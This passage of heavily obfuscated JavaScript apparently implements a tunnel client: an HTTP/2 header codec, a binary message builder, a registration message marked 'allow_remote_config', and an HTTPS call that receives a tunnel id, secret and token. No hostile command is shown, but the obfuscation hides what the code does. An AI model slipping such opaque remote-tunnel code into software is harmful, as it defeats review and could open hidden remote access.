        while (c['paXwA'](this[d4(0x3ca)][d4(0x7f5)], 0x0) && c[d4(0x5a5)](c[d4(0x3ee)](this[d4(0x577)], d), this[d4(0x8ea)])) {
            const [f, g] = this[d4(0x3ca)][d4(0x282)]();
            this[d4(0x577)] -= 0x20 + Buffer[d4(0x885)](f, c['HTKOJ']) + Buffer[d4(0x885)](g, c[d4(0x3be)]);
        }
        this[d4(0x3ca)]['unshift']([
            a,
            b
        ]), this[d4(0x577)] += d;
    }
    [a0aY(0x8cc)](a) {
        const d5 = a0aY, b = {
                'TPBhW': function (f, g) {
                    return f < g;
                },
                'pvQCr': function (f, g) {
                    return f & g;
                },
                'gMNWN': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'vMdAP': function (f, g) {
                    return f & g;
                },
                'cVKyK': function (f, g, h) {
                    return f(g, h);
                },
                'INttV': d5(0x610),
                'kjgko': function (f, g) {
                    return f > g;
                },
                'YRrtp': function (f, g, h) {
                    return f(g, h);
                }
            }, c = [];
        let d = 0x0;
        while (b['TPBhW'](d, a[d5(0x7f5)])) {
            const f = a[d];
            if (b[d5(0x97f)](f, 0x80)) {
                let j;
                [j, d] = b[d5(0x2e6)](a0ad, a, d, 0x7), c[d5(0x39c)](this[d5(0x3d0)](j));
                continue;
            }
            if (b[d5(0x86d)](f, 0x40)) {
                let k, l;
                [k, d] = a0ad(a, d, 0x6);
                if (k)
                    l = this[d5(0x3d0)](k)[0x0];
                else {
                    let o;
                    [o, d] = b[d5(0x6fc)](a0ae, a, d), l = o[d5(0x248)](b['INttV'])[d5(0x216)]();
                }
                let m;
                [m, d] = a0ae(a, d);
                const n = m[d5(0x248)](b[d5(0x92c)]);
                this[d5(0x23c)](l, n), c[d5(0x39c)]([
                    l,
                    n
                ]);
                continue;
            }
            if (b[d5(0x97f)](f, 0x20)) {
                let p;
                [p, d] = a0ad(a, d, 0x5);
                if (p > 0x1000)
                    throw new Error(d5(0x4fb));
                this[d5(0x8ea)] = p;
                while (this[d5(0x3ca)]['length'] > 0x0 && b[d5(0x4da)](this[d5(0x577)], p)) {
                    const [q, r] = this[d5(0x3ca)][d5(0x282)]();
                    this[d5(0x577)] -= 0x20 + Buffer[d5(0x885)](q, d5(0x610)) + Buffer[d5(0x885)](r, b['INttV']);
                }
                continue;
            }
            let g, h;
            [g, d] = b[d5(0x2e6)](a0ad, a, d, 0x4);
            if (g)
                h = this[d5(0x3d0)](g)[0x0];
            else {
                let s;
                [s, d] = b[d5(0x2ca)](a0ae, a, d), h = s[d5(0x248)](b[d5(0x92c)])[d5(0x216)]();
            }
            let i;
            [i, d] = b[d5(0x6fc)](a0ae, a, d), c[d5(0x39c)]([
                h,
                i[d5(0x248)](b[d5(0x92c)])
            ]);
        }
        return c;
    }
}
function a0ag(a, b, c) {
    const d6 = a0aY, d = {
            'GikxF': function (h, i) {
                return h - i;
            },
            'WybvH': function (h, i) {
                return h | i;
            },
            'vMBNo': function (h, i) {
                return h >= i;
            },
            'cfULw': function (h, i) {
                return h & i;
            },
            'PicjH': function (h, i) {
                return h / i;
            }
        }, f = d[d6(0x950)](0x1 << b, 0x1);
    if (a < f)
        return Buffer['from']([d['WybvH'](c, a)]);
    const g = [c | f];
    a -= f;
    while (d['vMBNo'](a, 0x80)) {
        g[d6(0x39c)](d[d6(0x2f2)](a, 0x7f) | 0x80), a = Math[d6(0x59f)](d[d6(0x826)](a, 0x80));
    }
    return g[d6(0x39c)](a), Buffer[d6(0x4ed)](g);
}
function a0ah(a) {
    const d7 = a0aY, b = {
            'nyYsn': d7(0x610),
            'mjXWb': function (d, f, g, h) {
                return d(f, g, h);
            }
        }, c = Buffer[d7(0x4ed)](a, b[d7(0x28b)]);
    return Buffer['concat']([
        b[d7(0x6a1)](a0ag, c[d7(0x7f5)], 0x7, 0x0),
        c
    ]);
}
function a0ai(a) {
    const d8 = a0aY, b = {
            'MKHyn': function (d, f) {
                return d === f;
            },
            'bAMaF': function (d, f) {
                return d === f;
            },
            'AhzWc': d8(0x673),
            'LjUUD': d8(0x736),
            'ZsFZM': function (d, f) {
                return d === f;
            },
            'QllLZ': d8(0x8d6),
            'zsBjY': d8(0x377),
            'UDAqm': function (d, f) {
                return d === f;
            },
            'OYWTH': d8(0x6c4),
            'svuCv': function (d, f) {
                return d === f;
            },
            'tgULs': d8(0x7ac),
            'Bpnqy': function (d, f) {
                return d === f;
            },
            'yRYxT': d8(0x7d1),
            'lFDxa': function (d, f) {
                return d === f;
            },
            'jTeCA': function (d, f) {
                return d === f;
            },
            'CBjBC': d8(0x529),
            'ufRTT': function (d, f, g, h) {
                return d(f, g, h);
            },
            'SITgw': function (d, f) {
                return d(f);
            },
            'ClckC': function (d, f) {
                return d(f);
            }
        }, c = [];
    for (const [d, f] of a) {
        if (b[d8(0x279)](d, d8(0x736)) && b[d8(0x91d)](f, b['AhzWc']))
            c[d8(0x39c)](0x88);
        else {
            if (d === b[d8(0x8bc)] && b[d8(0x64d)](f, b[d8(0x7c4)]))
                c[d8(0x39c)](0x89);
            else {
                if (b[d8(0x64d)](d, b[d8(0x8bc)]) && b[d8(0x64d)](f, b['zsBjY']))
                    c[d8(0x39c)](0x8a);
                else {
                    if (b['UDAqm'](d, b['LjUUD']) && b['bAMaF'](f, b[d8(0x628)]))
                        c[d8(0x39c)](0x8b);
                    else {
                        if (d === d8(0x736) && b['svuCv'](f, b['tgULs']))
                            c[d8(0x39c)](0x8c);
                        else {
                            if (b['Bpnqy'](d, ':status') && b[d8(0x223)](f, b[d8(0x874)]))
                                c[d8(0x39c)](0x8d);
                            else
                                b['lFDxa'](d, d8(0x736)) && b[d8(0x39d)](f, b['CBjBC']) ? c['push'](0x8e) : (c[d8(0x39c)](...b[d8(0x250)](a0ag, 0x0, 0x4, 0x0)), c['push'](...b[d8(0x96a)](a0ah, d)), c[d8(0x39c)](...b[d8(0x7d4)](a0ah, f)));
                        }
                    }
                }
            }
        }
    }
    return Buffer['from'](c);
}
class a0aj {
    constructor() {
        const d9 = a0aY;
        this[d9(0x466)] = [];
    }
    [a0aY(0x21a)](a) {
        const da = a0aY, b = this['words'][da(0x7f5)];
        for (let c = 0x0; c < a; c++) {
            this[da(0x466)][da(0x39c)](0x0n);
        }
        return b;
    }
    ['structPtr'](a, b, c, d) {
        const db = a0aY, f = {
                'bjKpP': function (j, k) {
                    return j - k;
                },
                'qtgeA': function (j, k) {
                    return j << k;
                },
                'XTgHS': function (j, k) {
                    return j(k);
                },
                'GRvtl': function (j, k) {
                    return j | k;
                },
                'PzTzz': function (j, k) {
                    return j(k);
                },
                'IwOoc': function (j, k) {
                    return j & k;
                },
                'fZsHv': function (j, k) {
                    return j | k;
                }
            }, g = f[db(0x926)](f[db(0x926)](b, a), 0x1), h = f[db(0x670)](f[db(0x753)](BigInt, g), 0x2n) & 0xfffffffcn, i = f[db(0x4d0)](f['PzTzz'](BigInt, c & 0xffff), BigInt(f[db(0x444)](d, 0xffff)) << 0x10n);
        this[db(0x466)][a] = f[db(0x5d4)](h, i << 0x20n);
    }
    ['setU8'](a, b, c) {
        const dc = a0aY, d = {
                'TamGL': function (g, h) {
                    return g(h);
                },
                'bxgYo': function (g, h) {
                    return g * h;
                },
                'EAdyF': function (g, h) {
                    return g | h;
                },
                'whGWs': function (g, h) {
                    return g << h;
                },
                'CcYuG': function (g, h) {
                    return g(h);
                },
                'YopFZ': function (g, h) {
                    return g & h;
                }
            }, f = 0xffn << d[dc(0x78e)](BigInt, d[dc(0x1fc)](b, 0x8));
        this[dc(0x466)][a] = d['EAdyF'](this['words'][a] & ~f, d[dc(0x8be)](d[dc(0x8c4)](BigInt, d[dc(0x983)](c, 0xff)), BigInt(d[dc(0x1fc)](b, 0x8))));
    }
    [a0aY(0x645)](a, b, c) {
        const dd = a0aY, d = {
                'VohVW': function (g, h) {
                    return g << h;
                },
                'bEBOC': function (g, h) {
                    return g(h);
                },
                'SLEvA': function (g, h) {
                    return g * h;
                },
                'luvOi': function (g, h) {
                    return g | h;
                },
                'wFHtX': function (g, h) {
                    return g & h;
                },
                'FqqRi': function (g, h) {
                    return g(h);
                }
            }, f = d[dd(0x5f2)](0xffffn, d[dd(0x791)](BigInt, d['SLEvA'](b, 0x8)));
        this['words'][a] = d['luvOi'](d['wFHtX'](this['words'][a], ~f), d['FqqRi'](BigInt, d[dd(0x64c)](c, 0xffff)) << BigInt(b * 0x8));
    }
    [a0aY(0x4dc)](a, b, c) {
        const de = a0aY, d = {
                'eyAFk': function (g, h) {
                    return g << h;
                },
                'EGovF': function (g, h) {
                    return g(h);
                },
                'AWrkY': function (g, h) {
                    return g | h;
                },
                'ywbVV': function (g, h) {
                    return g << h;
                },
                'CPnCl': function (g, h) {
                    return g & h;
                },
                'RVRiC': function (g, h) {
                    return g(h);
                },
                'erBNJ': function (g, h) {
                    return g * h;
                }
            }, f = d[de(0x799)](0xffffffffn, d['EGovF'](BigInt, b * 0x8));
        this[de(0x466)][a] = d[de(0x73b)](this['words'][a] & ~f, d[de(0x590)](d[de(0x3f4)](BigInt, d[de(0x7ec)](c, 0xffffffff)), d[de(0x37a)](BigInt, d['erBNJ'](b, 0x8))));
    }
    [a0aY(0x5e9)](a, b) {
        const df = a0aY, c = {
                'wdgsG': function (d, f) {
                    return d & f;
                },
                'RRnxz': function (d, f) {
                    return d(f);
                }
            };
        this[df(0x466)][a] = c[df(0x6de)](c[df(0x27c)](BigInt, b), 0xffffffffffffffffn);
    }
    [a0aY(0x750)](a, b, c = ![]) {
        const dg = a0aY, d = {
                'XHTUr': function (m, n) {
                    return m === n;
                },
                'KNehx': dg(0x610),
                'alUPu': function (m, n) {
                    return m / n;
                },
                'tjONE': function (m, n) {
                    return m + n;
                },
                'EPGCW': function (m, n) {
                    return m / n;
                },
                'kiops': function (m, n) {
                    return m - n;
                },
                'mdWzY': function (m, n) {
                    return m & n;
                },
                'OzGgH': function (m, n) {
                    return m | n;
                },
                'diJLD': function (m, n) {
                    return m << n;
                },
                'AfNEr': function (m, n) {
                    return m(n);
                },
                'JuBsc': function (m, n) {
                    return m | n;
                },
                'iwmqN': function (m, n) {
                    return m(n);
                },
                'hlbsQ': function (m, n) {
                    return m & n;
                }
            }, f = d[dg(0x3c6)](typeof b, dg(0x709)) ? Buffer[dg(0x4ed)](b, d[dg(0x365)]) : b, g = f[dg(0x7f5)] + (c ? 0x1 : 0x0), h = this[dg(0x21a)](Math[dg(0x36e)](d[dg(0x6a7)](g, 0x8)));
        for (let m = 0x0; m < f['length']; m++) {
            this[dg(0x97e)](d['tjONE'](h, Math[dg(0x59f)](d[dg(0x665)](m, 0x8))), m % 0x8, f[m]);
        }
        const j = d['kiops'](h, a) - 0x1, k = d[dg(0x3c8)](d[dg(0x512)](d['diJLD'](d[dg(0x70f)](BigInt, j), 0x2n), 0x1n), 0xffffffffn), l = d['JuBsc'](0x2n, d[dg(0x24c)](d['iwmqN'](BigInt, d[dg(0x8af)](g, 0x1fffffff)), 0x3n));
        this['words'][a] = d['OzGgH'](k, d[dg(0x24c)](l, 0x20n));
    }
    ['writeTextList'](a, b) {
        const dh = a0aY, c = {
                'EqLtk': function (g, h) {
                    return g - h;
                },
                'fqbVo': function (g, h) {
                    return g - h;
                },
                'ueceW': function (g, h) {
                    return g | h;
                },
                'Xwwba': function (g, h) {
                    return g & h;
                },
                'VEAKX': function (g, h) {
                    return g << h;
                },
                'DgxNB': function (g, h) {
                    return g(h);
                },
                'gyAaI': function (g, h) {
                    return g << h;
                }
            };
        if (!b[dh(0x7f5)]) {
            this[dh(0x466)][a] = 0x0n;
            return;
        }
        const d = this['alloc'](b[dh(0x7f5)]), f = c[dh(0x63e)](c['fqbVo'](d, a), 0x1);
        this[dh(0x466)][a] = c[dh(0x328)](c[dh(0x83d)](c[dh(0x5b9)](c[dh(0x600)](BigInt, f), 0x2n) | 0x1n, 0xffffffffn), c[dh(0x5b9)](c[dh(0x328)](0x6n, c[dh(0x373)](BigInt(b[dh(0x7f5)]), 0x3n)), 0x20n));
        for (let g = 0x0; g < b[dh(0x7f5)]; g++) {
            this[dh(0x750)](d + g, b[g], !![]);
        }
    }
    [a0aY(0x849)]() {
        const di = a0aY, a = {
                'izHgR': function (d, f) {
                    return d * f;
                },
                'PFVLt': function (d, f) {
                    return d < f;
                },
                'aHnmn': function (d, f) {
                    return d & f;
                }
            }, b = Buffer[di(0x21a)](0x8);
        b[di(0x4bb)](0x0, 0x0), b['writeUInt32LE'](this['words'][di(0x7f5)], 0x4);
        const c = Buffer[di(0x21a)](a[di(0x42f)](this[di(0x466)][di(0x7f5)], 0x8));
        for (let d = 0x0; a[di(0x672)](d, this[di(0x466)][di(0x7f5)]); d++) {
            c['writeBigUInt64LE'](a[di(0x8c9)](this[di(0x466)][d], 0xffffffffffffffffn), a['izHgR'](d, 0x8));
        }
        return Buffer[di(0x8ed)]([
            b,
            c
        ]);
    }
}
function a0ak(a) {
    const dj = a0aY, b = new a0aj(), c = b[dj(0x21a)](0x1), d = b[dj(0x21a)](0x1), f = b[dj(0x21a)](0x1);
    b['structPtr'](c, d, 0x1, 0x1), b[dj(0x645)](d, 0x0, 0x8);
    const g = b[dj(0x21a)](0x1);
    return b[dj(0x21a)](0x1), b[dj(0x8f8)](f, g, 0x1, 0x1), b[dj(0x4dc)](g, 0x0, a), b[dj(0x849)]();
}
function a0al(a, b, c, d, f, g) {
    const dk = a0aY, h = {
            'rHgKR': function (H, I) {
                return H | I;
            },
            'aqIyi': function (H, I) {
                return H & I;
            },
            'fBkrP': function (H, I) {
                return H & I;
            },
            'OUUSF': dk(0x7a2),
            'QsLtx': dk(0x263)
        }, i = new a0aj(), j = i[dk(0x21a)](0x1), k = i['alloc'](0x1), l = i[dk(0x21a)](0x1);
    i[dk(0x8f8)](j, k, 0x1, 0x1), i[dk(0x645)](k, 0x0, 0x2);
    const m = i[dk(0x21a)](0x1), n = i[dk(0x21a)](0x1);
    i[dk(0x21a)](0x1);
    const o = i['alloc'](0x1), p = i[dk(0x21a)](0x1);
    i['alloc'](0x1), i[dk(0x8f8)](l, m, 0x3, 0x3), i[dk(0x4dc)](m, 0x0, a), i[dk(0x5e9)](n, 0xf71695ec7fe85497n);
    const q = i['alloc'](0x1), r = i[dk(0x21a)](0x1);
    i[dk(0x8f8)](o, q, 0x1, 0x1), i[dk(0x645)](q, 0x4, 0x1);
    const s = i[dk(0x21a)](0x1);
    i[dk(0x21a)](0x1), i['structPtr'](r, s, 0x1, 0x1), i[dk(0x4dc)](s, 0x0, b);
    const t = i[dk(0x21a)](0x1);
    i[dk(0x21a)](0x1), i[dk(0x8f8)](p, t, 0x0, 0x2);
    const u = i['alloc'](0x1), v = i['alloc'](0x1), w = i['alloc'](0x1), x = i[dk(0x21a)](0x1);
    i[dk(0x8f8)](t, u, 0x1, 0x3), i[dk(0x97e)](u, 0x0, g);
    const y = i[dk(0x21a)](0x1), z = i[dk(0x21a)](0x1);
    i['structPtr'](v, y, 0x0, 0x2), i['writeBytes'](y, c, !![]), i['writeBytes'](z, d), i['writeBytes'](w, f);
    const A = i['alloc'](0x1), B = i[dk(0x21a)](0x1);
    i[dk(0x21a)](0x1), i['structPtr'](x, A, 0x1, 0x2);
    const C = i['alloc'](0x1), D = i[dk(0x21a)](0x1), E = i[dk(0x21a)](0x1), F = i[dk(0x21a)](0x1);
    i[dk(0x8f8)](B, C, 0x0, 0x4);
    const G = a0k[dk(0x489)](0x10);
    return G[0x6] = h['rHgKR'](h[dk(0x504)](G[0x6], 0xf), 0x40), G[0x8] = h['rHgKR'](h[dk(0x401)](G[0x8], 0x3f), 0x80), i[dk(0x750)](C, G), i[dk(0x413)](D, [
        h[dk(0x51d)],
        'allow_remote_config'
    ]), i[dk(0x750)](E, dk(0x256), !![]), i[dk(0x750)](F, h[dk(0x310)], !![]), i[dk(0x849)]();
}
function a0am(a) {
    const dl = a0aY, b = {
            'nBYBq': function (f, g) {
                return f >= g;
            },
            'CfuEZ': function (f, g) {
                return f - g;
            },
            'vuHMy': function (f, g) {
                return f + g;
            },
            'yGGXD': function (f, g) {
                return f + g;
            },
            'JARFE': function (f, g) {
                return f * g;
            },
            'jPIRM': function (f, g) {
                return f < g;
            },
            'euvou': function (f, g) {
                return f - g;
            },
            'jxeon': function (f, g) {
                return f < g;
            },
            'LQhrH': function (f, g) {
                return f + g;
            },
            'ykVxt': function (f, g) {
                return f - g;
            },
            'prBnS': function (f, g) {
                return f !== g;
            },
            'TyvhH': dl(0x694),
            'oUSfL': function (f, g) {
                return f + g;
            },
            'EXKXR': function (f, g) {
                return f + g;
            }
        }, c = [];
    let d = 0x0;
    while (b['nBYBq'](b[dl(0x1e6)](a[dl(0x7f5)], d), 0x8)) {
        const f = a['readUInt32LE'](d), g = a[dl(0x61e)](b['vuHMy'](d, 0x4)), h = b[dl(0x574)](f, 0x1);
        let j = b[dl(0x834)](0x2, h), k = b[dl(0x8f6)](j, 0x4);
        k % 0x8 && (k += 0x4);
        if (b[dl(0x562)](b[dl(0x8a0)](a['length'], d), k))
            break;
        const l = [g];
        for (let n = 0x1; b[dl(0x479)](n, h); n++) {
            l['push'](a['readUInt32LE'](b['yGGXD'](d, 0x4) + b[dl(0x8f6)](n, 0x4)));
        }
        const m = b[dl(0x232)](k, b[dl(0x8f6)](l[dl(0x924)]((o, p) => o + p, 0x0), 0x8));
        if (b[dl(0x562)](b['ykVxt'](a[dl(0x7f5)], d), m))
            break;
        if (b[dl(0x3ff)](h, 0x1))
            throw new Error(b[dl(0x897)]);
        c['push'](a[dl(0x23d)](b[dl(0x295)](d, k), b[dl(0x70a)](d, m))), d += m;
    }
    return [
        c,
        a[dl(0x23d)](d)
    ];
}
function a0an(a, b) {
    const dm = a0aY, c = {
            'VXCny': function (j, k) {
                return j >= k;
            },
            'awYeR': dm(0x796),
            'SaEwG': function (j, k) {
                return j !== k;
            },
            'ywXqu': dm(0x620),
            'Gdqmo': function (j, k) {
                return j & k;
            },
            'CCwoV': function (j, k) {
                return j + k;
            },
            'uaabd': function (j, k) {
                return j + k;
            },
            'EDOjJ': function (j, k) {
                return j(k);
            },
            'tpfjF': function (j, k) {
                return j(k);
            },
            'UWaIi': function (j, k) {
                return j & k;
            },
            'uKAww': function (j, k) {
                return j >> k;
            },
            'IoHsh': function (j, k) {
                return j < k;
            },
            'fjpfT': function (j, k) {
                return j + k;
            }
        };
    if (c[dm(0x434)](b, a[dm(0x7f5)]))
        throw new Error(c[dm(0x322)]);
    const d = a[b];
    if (c[dm(0x33a)](d & 0x3n, 0x0n))
        throw new Error(c[dm(0x8ad)]);
    let f = d >> 0x2n & 0x3fffffffn;
    c['Gdqmo'](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[dm(0x4d2)](c[dm(0x42b)](b, 0x1), c[dm(0x5d3)](Number, f)), h = c[dm(0x374)](Number, d >> 0x20n & 0xffffn), i = c[dm(0x5d3)](Number, c[dm(0x472)](c[dm(0x40b)](d, 0x30n), 0xffffn));
    if (c[dm(0x8c5)](g, 0x0) || c[dm(0x8c6)](g + h, i) > a[dm(0x7f5)])
        throw new Error(c[dm(0x322)]);
    return [
        g,
        h,
        i
    ];
}
function a0ao(a, b) {
    const dn = a0aY, c = {
            'UWedA': function (m, n) {
                return m >= n;
            },
            'mOUce': function (m, n) {
                return m !== n;
            },
            'QgWvW': function (m, n) {
                return m & n;
            },
            'BHKiU': function (m, n) {
                return m + n;
            },
            'bgxyi': function (m, n) {
                return m(n);
            },
            'WbaVy': function (m, n) {
                return m(n);
            },
            'LTklx': function (m, n) {
                return m & n;
            },
            'xENxL': function (m, n) {
                return m >> n;
            },
            'ypGkd': function (m, n) {
                return m >> n;
            },
            'imntb': function (m, n) {
                return m < n;
            },
            'bgWLg': function (m, n) {
                return m > n;
            },
            'hRRxo': function (m, n) {
                return m * n;
            },
            'dlIkl': function (m, n) {
                return m < n;
            },
            'TsDgJ': function (m, n) {
                return m + n;
            },
            'PNXjk': dn(0x610)
        };
    if (c[dn(0x89d)](b, a[dn(0x7f5)]))
        return '';
    const d = a[b];
    if (c[dn(0x706)](c['QgWvW'](d, 0x3n), 0x1n))
        return '';
    let f = d >> 0x2n & 0x3fffffffn;
    f & 0x20000000n && (f -= 0x40000000n);
    const g = c[dn(0x26a)](b + 0x1, c['bgxyi'](Number, f)), h = c[dn(0x36f)](Number, c[dn(0x84a)](c[dn(0x83b)](d, 0x20n), 0x7n)), j = Number(c[dn(0x61f)](d, 0x23n)), k = Math[dn(0x36e)](j / 0x8);
    if (c[dn(0x706)](h, 0x2) || c[dn(0x41c)](g, 0x0) || c[dn(0x363)](c[dn(0x26a)](g, k), a[dn(0x7f5)]))
        return '';
    const l = Buffer[dn(0x21a)](c[dn(0x3d4)](k, 0x8));
    for (let m = 0x0; c['dlIkl'](m, k); m++) {
        l[dn(0x968)](a[c[dn(0x3fa)](g, m)] & 0xffffffffffffffffn, m * 0x8);
    }
    return l[dn(0x23d)](0x0, j)['toString'](c[dn(0x521)])['replace'](/\0+$/, '');
}
function a0ap(a) {
    const dp = a0aY, b = {
            'fUzZA': function (z, A) {
                return z % A;
            },
            'EYyhj': dp(0x42c),
            'lhdsM': function (z, A) {
                return z < A;
            },
            'PUWMy': function (z, A) {
                return z * A;
            },
            'zazQT': function (y, z, A) {
                return y(z, A);
            },
            'rILqq': function (z, A) {
                return z < A;
            },
            'ZOOSr': function (z, A) {
                return z !== A;
            },
            'XWZyd': function (z, A) {
                return z & A;
            },
            'YUCnV': function (y, z, A) {
                return y(z, A);
            },
            'oZnjD': function (y, z) {
                return y(z);
            },
            'LhJCL': function (z, A) {
                return z >> A;
            },
            'kizUQ': function (z, A) {
                return z === A;
            },
            'fIlRt': function (z, A) {
                return z + A;
            },
            'cvlel': function (z, A) {
                return z !== A;
            },
            'AigQd': function (z, A) {
                return z + A;
            },
            'feFpT': dp(0x3a3),
            'UcfoG': function (y, z, A) {
                return y(z, A);
            },
            'oDwgl': function (z, A) {
                return z & A;
            },
            'pYocV': function (z, A) {
                return z + A;
            },
            'Zgmjl': dp(0x572),
            'ZwdFn': function (z, A) {
                return z + A;
            },
            'IDwbc': function (y, z, A) {
                return y(z, A);
            },
            'XTsTO': function (z, A) {
                return z + A;
            },
            'GkWeS': function (y, z) {
                return y(z);
            },
            'VeylX': function (z, A) {
                return z & A;
            }
        };
    if (b[dp(0x730)](a[dp(0x7f5)], 0x8) || a[dp(0x7f5)] < 0x18)
        throw new Error(b[dp(0x3aa)]);
    const c = [];
    for (let y = 0x0; b[dp(0x4ea)](y, a['length'] / 0x8); y++) {
        c[dp(0x39c)](a[dp(0x783)](b[dp(0x7b2)](y, 0x8)));
    }
    let d, f, g;
    [d, f, g] = b[dp(0x7ab)](a0an, c, 0x0);
    if (b[dp(0x514)](f, 0x1) || b[dp(0x280)](b[dp(0x3f3)](c[d], 0xffffn), 0x3n))
        throw new Error(dp(0x85d));
    let h, j, k;
    [h, j, k] = b['YUCnV'](a0an, c, d + f);
    const l = b[dp(0x201)](Number, b[dp(0x3f3)](b[dp(0x3f0)](c[h], 0x30n), 0xffffn));
    if (b[dp(0x6a5)](l, 0x1))
        return {
            'ok': ![],
            'error': b['zazQT'](a0ao, c, b[dp(0x515)](h, j))
        };
    if (b[dp(0x30f)](l, 0x0))
        return {
            'ok': ![],
            'error': b['AigQd'](b[dp(0x80e)], l)
        };
    let m, n, o;
    [m, n, o] = b[dp(0x818)](a0an, c, b[dp(0x349)](h, j));
    let p, q, r;
    [p, q, r] = b['UcfoG'](a0an, c, b[dp(0x349)](m, n));
    const s = c[p], t = b[dp(0x201)](Number, b[dp(0x51f)](s, 0xffffn));
    if (t === 0x0)
        return {
            'ok': ![],
            'error': b[dp(0x633)](a0ao, c, p + q)
        };
    if (t !== 0x1)
        return {
            'ok': ![],
            'error': b['pYocV'](b[dp(0x887)], t)
        };
    let u, v, w;
    [u, v, w] = a0an(c, b['ZwdFn'](p, q));
    const x = b[dp(0x51e)](a0ao, c, b[dp(0x45c)](u + v, 0x1));
    return {
        'ok': !![],
        'location': x,
        'remoteManaged': b[dp(0x6bc)](Boolean, b[dp(0x963)](c[u], 0x1n))
    };
}
const a0aq = {
    '.js': a0aY(0x2e0),
    '.mjs': a0aY(0x2e0),
    '.css': a0aY(0x4c5),
    '.json': 'application/json;\x20charset=utf-8',
    '.map': a0aY(0x970),
    '.wasm': 'application/wasm',
    '.html': 'text/html;\x20charset=utf-8',
    '.htm': a0aY(0x301),
    '.svg': a0aY(0x2ed),
    '.xml': a0aY(0x8bd),
    '.woff': a0aY(0x3d7),
    '.woff2': 'font/woff2',
    '.png': a0aY(0x344),
    '.jpg': a0aY(0x787),
    '.jpeg': 'image/jpeg',
    '.gif': a0aY(0x5d8),
    '.ico': a0aY(0x648)
};
function a0ar(a) {
    const dq = a0aY, b = {
            'mXHcg': function (f, g) {
                return f < g;
            }
        }, c = a[dq(0x5a6)]('/') ? a[dq(0x710)](0x0, -0x1) : a, d = c[dq(0x864)]('.');
    if (b[dq(0x483)](d, 0x0))
        return '';
    return a0aq[c[dq(0x710)](d)['toLowerCase']()] || '';
}
function a0as(a) {
    const dr = a0aY, b = {
            'gwCjD': function (c, d) {
                return c !== d;
            },
            'gtYzb': dr(0x709),
            'BFVtS': function (c, d) {
                return c + d;
            },
            'DhvJn': function (c, d) {
                return c % d;
            },
            'ZpVll': 'base64'
        };
    if (Array['isArray'](a))
        return Buffer[dr(0x4ed)](a);
    if (b[dr(0x551)](typeof a, b[dr(0x47e)]))
        throw new Error(dr(0x5fd));
    return Buffer['from'](b[dr(0x356)](a, '='[dr(0x2f5)](b[dr(0x31f)](-a[dr(0x7f5)], 0x4))), b[dr(0x94c)]);
}
const a0at = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
function a0au(a) {
    const ds = a0aY, b = {
            'UDuTj': function (c, d) {
                return c(d);
            },
            'czAVm': ds(0x5f8),
            'SARxp': ds(0x53f),
            'sHPuL': ds(0x6eb),
            'XZIzm': function (c, d) {
                return c(d);
            },
            'usCvo': function (c, d) {
                return c + d;
            },
            'CgZWg': ds(0x8ac),
            'XUcIl': function (c, d) {
                return c === d;
            },
            'AGFio': 'https:',
            'JTHdG': ds(0x920),
            'dOmMl': ds(0x65e),
            'Fdgnq': 'error'
        };
    return new Promise((c, d) => {
        const dt = ds, f = {
                'ucbfS': function (j, k) {
                    return j + k;
                },
                'FOSUj': dt(0x5b8),
                'vMRkv': dt(0x72f),
                'vLZDy': function (j, k) {
                    const du = dt;
                    return b[du(0x261)](j, k);
                },
                'NSDkj': b[dt(0x6e7)],
                'ZbErv': function (j, k) {
                    return j !== k;
                },
                'iFNaY': function (j, k) {
                    return j(k);
                },
                'GQVkR': dt(0x410),
                'byeYr': 'error',
                'LYsBs': b[dt(0x947)]
            };
        let g;
        try {
            g = new URL(a[dt(0x773)](/\/+$/, '') + b['sHPuL']);
        } catch (j) {
            b[dt(0x3fc)](d, new Error(b[dt(0x442)](b[dt(0x8b3)], j[dt(0x842)])));
            return;
        }
        const h = b[dt(0x81d)](g[dt(0x5cf)], b['AGFio']) ? a0h : a0g, i = h[dt(0x8b2)](g, {
                'method': b[dt(0x329)],
                'headers': {
                    'Content-Type': dt(0x8b1),
                    'User-Agent': b[dt(0x3bc)]
                },
                'timeout': 0x3a98
            }, k => {
                const dv = dt, l = {
                        'RPqhN': 'utf8',
                        'mmFZI': function (n, o) {
                            return n(o);
                        },
                        'kIaVQ': function (n, o) {
                            return f['ucbfS'](n, o);
                        },
                        'kSrNJ': f[dv(0x879)],
                        'lVjoL': f['vMRkv'],
                        'zpeqw': function (n, o) {
                            const dw = dv;
                            return f[dw(0x7af)](n, o);
                        },
                        'AjpuE': f[dv(0x591)],
                        'eFvSD': function (n, o) {
                            const dx = dv;
                            return f[dx(0x4f7)](n, o);
                        },
                        'Hxlcz': dv(0x709),
                        'CVqXh': function (n, o) {
                            return f['iFNaY'](n, o);
                        },
                        'FUHos': function (n, o) {
                            const dy = dv;
                            return f[dy(0x7af)](n, o);
                        },
                        'PIcoz': f[dv(0x2a7)]
                    }, m = [];
                k['on']('data', n => m['push'](n)), k['on'](f[dv(0x68d)], d), k['on'](f[dv(0x90e)], () => {
                    const dz = dv, n = Buffer[dz(0x8ed)](m), o = k['statusCode'];
                    let p;
                    try {
                        p = JSON['parse'](n[dz(0x248)](l['RPqhN']));
                    } catch (r) {
                        l['mmFZI'](d, new Error(l['kIaVQ'](l[dz(0x7a9)] + o, l['lVjoL']) + n[dz(0x23d)](0x0, 0x12c)[dz(0x248)](l['RPqhN'])));
                        return;
                    }
                    const q = p['result'] || {};
                    if (!(p[dz(0x643)] ?? !![]) || !q) {
                        d(new Error(l['kIaVQ'](dz(0x2b8), JSON[dz(0x852)](p['errors']))));
                        return;
                    }
                    try {
                        const s = l[dz(0x8d7)](String, q['id']);
                        if (!a0at[dz(0x4ef)](s))
                            throw new Error(l['AjpuE']);
                        if (l[dz(0x677)](typeof q[dz(0x93f)], l[dz(0x392)]) || l[dz(0x677)](typeof q[dz(0x987)], 'string'))
                            throw new Error(dz(0x679));
                        const t = l[dz(0x593)](a0as, q['secret']), u = Buffer['from'](s[dz(0x773)](/-/g, ''), 'hex');
                        l[dz(0x397)](c, [
                            q[dz(0x987)],
                            q[dz(0x93f)],
                            t,
                            u
                        ]);
                    } catch (v) {
                        d(new Error(l[dz(0x909)](l['PIcoz'], v[dz(0x842)])));
                    }
                });
            });
        i['on'](b[dt(0x5ad)], k => d(new Error(dt(0x8ac) + k['message']))), i[dt(0x53f)]();
    });
}
function a0av(a) {
    const dA = a0aY;
